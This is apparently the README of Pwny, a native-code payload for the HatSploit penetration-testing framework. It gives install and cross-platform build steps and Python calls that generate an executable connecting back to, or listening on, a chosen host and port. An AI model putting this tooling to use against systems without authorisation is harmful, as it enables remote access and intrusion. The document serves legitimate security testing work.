# Pwny

<p>
    <a href="https://entysec.netlify.app">
        <img src="https://img.shields.io/badge/developer-EntySec-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/Pwny">
        <img src="https://img.shields.io/badge/language-C-grey.svg">
    </a>
    <a href="https://github.com/EntySec/Pwny/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/Pwny?color=yellow">
    </a>
</p>

Pwny is an implementation of an advanced native-code HatSploit payload, designed for portability, embeddability, and low resource utilization.

## Installing

You should install HatSploit to get Pwny, because Pwny depends on HatSploit Framework.

```
pip3 install git+https://github.com/EntySec/HatSploit
```

## Building Pwny

**Dependencies:** `libssl.a`, `libcrypto.a` (`openssl`)

These are platforms which are supported by Pwny.

* **macOS** - `make all platform=macos sdk=<path>`
* **Apple iOS** - `make all platform=apple_ios sdk=<path>`
* **Linux** - `make all platform=linux`
* **Windows** - `make all platform=windows`

**NOTE:** To compile for target `macos` you will need to download patched SDKs from [here](https://github.com/phracker/MacOSX-SDKs) and to compile for `apple_ios` target you will need to download patched SDKs from [here](https://github.com/theos/sdks).

## Basic usage

To use Pwny and build payloads you should import it to your source.

```python3
from pwny import Pwny
from pwny.session import PwnySession
```

* `Pwny` - Pwny utilities, mostly for generating payloads and encoding arguments.
* `PwnySession` - Wrapper for `HatSploitSession` for Pwny, HatSploit should use it with Pwny payload.

To get Pwny template, you should call `get_template()`.

```python3
from pwny import Pwny

pwny = Pwny()
template = pwny.get_template('linux', 'x64')
```

To encode Pwny data, you should call `encode_data()`.

```python3
from pwny import Pwny

pwny = Pwny()
args = pwny.encode_data('127.0.0.1', 8888)
```

To get Pwny executable, you should call `get_pwny()`.

```python3
from pwny import Pwny

pwny = Pwny()
executable = pwny.get_pwny('linux', 'x64', '127.0.0.1', 8888)
```

**NOTE:** If you want Pwny to connect you should specify both `host` and `port`, but if you want Pwny to listen, you should specify only `port`.

## Adding Pwny payload

To add Pwny payload to HatSploit you should follow these steps.

* Write a basic HatSploit payload template.
* Import `Pwny` and `PwnySession` and put `Pwny` to `HatSploitPayload` class.
* Set payload parameter `Session` to `PwnySession`.
* Return `get_pwny()` with platform, architecture and host and port specified.

```python3
return self.get_pwny(
    self.details['Platform'],
    self.details['Architecture'],
    remote_host,
    remote_port
)
```
